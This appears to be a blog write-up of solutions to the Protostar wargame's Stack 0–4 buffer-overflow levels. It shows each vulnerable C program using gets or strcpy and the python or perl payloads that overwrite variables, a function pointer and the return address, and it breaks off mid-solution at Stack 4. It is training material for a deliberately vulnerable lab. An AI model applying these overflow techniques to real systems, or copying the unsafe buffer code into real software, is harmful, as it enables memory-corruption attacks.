These are the solutions to the Protostar Game on Exercise Solutions

Stack 0 - This is the first exercise in the protostar game and as is customary the challenge itself is gentle. Also
as with these games there is more than one way of solving and in these cases there are also more than one language
can be used. The first challenge shows a piece of c code which can be exploited, the site itself states that the
main concept is that memory can be accessed outside of its allocated region and any modifications can alter program
execution. The first challenge is basically an overflow challenge, the code itself is this

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
 volatile int modified;
 char buffer[64];

 modified = 0;
 gets(buffer);

 if(modified != 0) {
  printf("you have changed the 'modified' variable\n");
 } else {
  printf("Try again?\n");
 }
}

As you can see the variable called modified is put on to the stack and then the buufer which is 64 bytes is
assigned. Because for this challenge there is no limitation on writing to the stack all that is needed is to write
enough to overflow the stack like so in python

python -c "print 'A'*68" | ./stack0
Essentially you are sending numerous copies of the letter 'A' into the stack in order to overflow it which will
then give you the 'you have changed the 'modified' variable' message.
There are also perl solutions around like this
perl -e 'print "A"x65' | ./stack0
But I am not that familiar with perl so this is not really an option for me but the basic premise is the same.





Stack 1 -
As is the norm in a lot of online wargames a level is similar to the preceeding one and this is the case here too.
The main difference from the last challenge is that instead of merely changing the value it needs to be changed to
meet a specific value which is 0x61626364, or “dcba” in ASCII. The solution is going to be similar in that you will
have to add in a certain amount of material in order to obtain this value. The code itself looks like this

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
 volatile int modified;
 char buffer[64];

 if(argc == 1) {
  errx(1, "please specify an argument\n");
 }

 modified = 0;
 strcpy(buffer, argv[1]);

 if(modified == 0x61626364) {
  printf("you have correctly got the variable to the right value\n");
 } else {
  printf("Try again, you got 0x%08x\n", modified);
 }
}

The solution is like above -

python -c "print 'A'*64+'dcba'"

There are 64 copies of 'A' sent to the stack and 'abcd' which is read in backwards due to the x86 platform being
little endian, there is a good explanation on endianess and other bits here -
http://betterexplained.com/articles/understanding-big-and-little-endian-byte-order/
Also like above there are similar solutions available in perl, ruby and others but they all use the same logic, it
is also worth poiting out that these challenges are often only solved after brute force trial and error of the 
amount of material needed to force an overflow.
*******************************************************************************************************************
Important - There is a python exploit development script called peda which can be used in conjunction with gbd and
can reduce the amount of work needed, the code is available here https://github.com/longld/peda and there is a 
guide here http://security.cs.pub.ro/hexcellents/wiki/kb/toolset/peda
*******************************************************************************************************************



Stack 2 - 
In this challenge again we are asked to overwrite a variable but this time it is slighly different that what we 
have done before. The code is this 

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
 volatile int modified;
 char buffer[64];
 char *variable;

 variable = getenv("GREENIE");

 if(variable == NULL) {
  errx(1, "please set the GREENIE environment variable\n");
 }

 modified = 0;

 strcpy(buffer, variable);

 if(modified == 0x0d0a0d0a) {
  printf("you have correctly modified the variable\n");
 } else {
  printf("Try again, you got 0x%08x\n", modified);
 }

}

Again the solution is similar to the previous 2 challenges but this time instead of just adding values we have to
make sure to use an environmental variable like below.

GREENIE= `python -c 'print "A"*64+"\x0a\x0d\x0a\x0d"' (remember endianess!!!!)
export GREENIE
./stack2

This will give you the success message




Stack 3 -
In this challenge builds on the previouc challenges but again with a little twist which is that instead of giving
a modified variable a new value this time the change must jump to a method thus changing the code flow. The code
itself is this 

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
 printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
 volatile int (*fp)();
 char buffer[64];

 fp = 0;

 gets(buffer);

 if(fp) {
  printf("calling function pointer, jumping to 0x%08x\n", fp);
  fp();
 }
}

In order to proceed it is necessary to find out where the win function is located in memory. There are a couple
of different tools that can do the job objdump or gdb. The objdump looks like this

objdump -d stack3 

or using grep for the win function 

objdump -d stack3 | grep win

Either will give you the address of the win function and using the information gathered in the previous challenges
will allow you to pass the challenge. The solution lies in the fact that overwriting the fp function to point to
the win function will win the challenge. Also as before there are different languages that can be used to pass the
challenge but as it has been python been used this is what I will stick with so the solution is

echo `python -c "print 'A'*64+'\x24\x84\x04\x08'"` | ./stack3

This takes the win address and remembering endianess adds 64 copies of the letter A and pipes it into the stack3
challenge thus completing the overwrite. For information sake the GDB method is similar using 
gdb -q stack3 and then when in the gdb shell using p win which will find the win value and then the end stage is 
the same.




Stack 4 - 
The challenge of the stack4 level is like previous challenges and that is to alter program flow in order to run a
particular function. The source code provided is this

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];
  gets(buffer);
}

Like in other challenges there is a need to find out where in memory this win() function is, using objdump like in
other challenges will accomplish this

objdump -d stack4 | grep win

Unlike in other challenges this time there is no function pointer to overwrite which meant that using the hints
from the site that the return address written into EIP when the main() function finishes will have to be the value
overwritten. The method for overwriting will be similar for previous challenges but getting the correct value is
the main issue. Like all other thing there are a few different ways that can be used but most use automated tools
such as the  pattern_create.rb and pattern_offset.rb tools from the Metasploit framework. There is an excellent
free training course in metasploit located at -

https://www.offensive-security.com/metasploit-unleashed/

The pattern create tool allows for the generation of a unique string which is then fed into the program after this
the offset program searches for patterns. In this case the offset program discovers that the offset needed to
overwrite EIP is 76 so the solution again using python is
